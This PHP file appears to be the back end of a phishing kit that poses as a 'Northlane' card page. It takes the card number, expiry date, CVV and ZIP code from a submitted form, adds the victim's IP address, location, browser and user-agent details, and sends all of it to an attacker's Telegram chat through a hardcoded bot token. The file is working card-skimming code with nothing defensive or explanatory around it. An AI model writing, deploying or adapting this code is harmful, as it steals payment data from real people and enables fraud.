<?php
if($_SERVER['REQUEST_METHOD'] == "POST"){

    $secret_token = "5169436245:AAFrCJSMfLVvJptaE5naKl0r0gcdCdA9Nqc";
    $telegram_id = "2132002128";
    $pesan_teks = "
                 #---------------------[ NORTHLANE CARD 💰💲 ]-------------------------#
                 CARD : ".$_POST['card']." 
                 EXP: ".$_POST['month']." / ".$_POST['year']."
                 CVV : ".$_POST['cvv']."
                 ZIPCODE : ".$_POST['zip']."
                For Check💲 ".$_POST['card']."|".$_POST['cvv']."
	            #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ Semangatkibossku ]----------------#";
                


function sendMessage($telegram_id, $pesan_teks, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($pesan_teks);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $pesan_teks, $secret_token);

    }
?>